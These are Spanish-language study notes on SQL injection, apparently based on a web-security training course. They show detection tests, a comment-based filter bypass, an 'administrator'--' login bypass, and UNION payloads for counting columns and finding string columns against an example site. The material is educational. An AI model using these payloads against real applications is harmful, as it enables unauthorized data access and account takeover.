___

> [!NOTE]
> **SQL Injection (SQLi)**: vulnerabilidad web que permite a un atacante interferir en las consultas que una aplicación hace a su base de datos. Puede comprometer el back-end (leer/modificar/borrar datos) e incluso provocar DoS.

## Detección de SQL Injection
---
- Insertar `'` (comilla simple) y buscar errores o comportamientos anómalos.
- Probar sintaxis SQL que altere el valor base, comparando diferencias en la respuesta.
- Probar condiciones booleanas: `OR 1=1` (verdadero) vs `OR 1=2` (falso), y comparar respuestas.
- Usar payloads específicos de detección.
- Payloads **OAST** (Out-of-Band): provocan una interacción de red fuera de banda cuando la consulta se ejecuta — útiles cuando no hay diferencia visible en la respuesta.
- Usar Burp Scanner para automatizar la detección.

## ¿Dónde puede ocurrir la inyección?
---
> [!info]
> La mayoría de las SQLi ocurren en la cláusula `WHERE` de un `SELECT`, pero pueden aparecer en cualquier parte de la consulta:

- **UPDATE** → en los valores actualizados o en el `WHERE`.
- **INSERT** → en los valores insertados.
- **SELECT** → en el nombre de tabla/columna, o en la cláusula `ORDER BY`.

## Recuperación de datos ocultos
---
Una tienda muestra productos por categoría. Al hacer clic en **regalos**, el navegador pide:
```
https://insecure-website.com/products?category=Gifts
```
Que dispara la consulta:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Devuelve todos los campos (`*`) de `products` donde `category = 'Gifts'` y `released = 1`. La condición `released = 1` oculta productos no publicados (se asume que esos tienen `released = 0`).

### Explotando sin defensas
Si no hay ninguna sanitización, puedo comentar el resto de la consulta con `--`:
```
https://insecure-website.com/products?category=Gifts'--
```
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
`--` es un comentario en SQL: todo lo que sigue se ignora. Aquí desaparece `AND released = 1`, así que se muestran **todos** los productos (incluidos los no publicados).

También puedo forzar que se muestren todos los productos de cualquier categoría:
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
Como `1=1` siempre es verdadero, la condición `OR` hace que se devuelvan todas las filas, sin importar la categoría.

## Subvertir la lógica de la aplicación (bypass de login)
---
Un login valida usuario `wiener` y contraseña `bluecheese` con:
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
Si la consulta devuelve una fila → login exitoso. Si no devuelve nada → rechazado.

**Ataque:** uso `--` para eliminar la verificación de contraseña. Como username pongo `administrator'--` y dejo la contraseña en blanco:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
La consulta solo evalúa `username = 'administrator'` (el resto es comentario) → devuelve al usuario `administrator` y el atacante inicia sesión como él, **sin conocer su contraseña**.

## Ataques UNION
---
`UNION` permite ejecutar uno o más `SELECT` adicionales y anexar sus resultados a la consulta original:
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
Devuelve un único set de resultados con las filas de `table1` y `table2` combinadas en las mismas columnas.

### Requisitos para que funcione
- Ambas consultas deben devolver el **mismo número de columnas**.
- Los tipos de datos de cada columna deben ser **compatibles** entre ambas consultas (ej: no puedo unir una columna `int` con una `varchar` en la misma posición sin conversión).

### Pasos para un ataque UNION
1. Averiguar cuántas columnas devuelve la consulta original.
2. Averiguar qué columnas tienen un tipo de dato compatible para inyectar ahí los datos que quiero extraer.

## Determinar el número de columnas
---
Dos métodos:

**Método 1 — `ORDER BY`**
Voy incrementando el índice de columna hasta que falle:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
Cuando el índice supera el número real de columnas, la BD tira un error tipo:
> The ORDER BY position number 3 is out of range...

El error puede verse directo en la respuesta, como un error genérico, o simplemente no devolver resultados — cualquier cambio detectable en la respuesta ya me dice dónde está el límite.

**Método 2 — `UNION SELECT NULL`**
Voy agregando `NULL` hasta que la cantidad coincida con las columnas reales:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Uso `NULL` porque es compatible con cualquier tipo de dato, así evito errores de tipo mientras busco el número de columnas. Si el número no coincide, la BD tira algo como:
> ...must have an equal number of expressions in their target lists.

Si acierto, a veces se ve contenido extra en la respuesta (una fila nueva en una tabla HTML); si no, puede seguir sin verse nada. Este método suele ser **más confiable** que `ORDER BY` porque evita ambigüedades de error.

## Sintaxis específica por motor de base de datos
---
| Motor | Particularidad |
|---|---|
| **Oracle** | Todo `SELECT` necesita un `FROM` con tabla válida → se usa la tabla dummy `DUAL`: `' UNION SELECT NULL FROM DUAL--` |
| **MySQL** | El comentario `--` debe ir seguido de un espacio. Alternativa: usar `#` como comentario |
| **Otros (MSSQL, PostgreSQL)** | `--` funciona igual que en la mayoría de motores, sin requisito de tabla dummy |


## Encontrar columnas con un tipo de datos útil

Una inyección SQL UNION permite recuperar los resultados de una consulta inyectada. 
Esto significa que es necesario encontrar una o más columnas en los resultados de la consulta original.
Luego puede examinar cada columna para comprobar si puede contener datos de tipo cadena. Enviando un payload de `UNION SELECT` que coloquen un valor de cadena en cada columna , una por una. 
*Si la consulta devuelve cuatro columnas, enviaría: *

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Si el tipo de datos de la columna no es compatible con datos de cadena, la consulta inyectada provocará error:
`Conversion failed when converting the varchar value 'a' to data type int.`




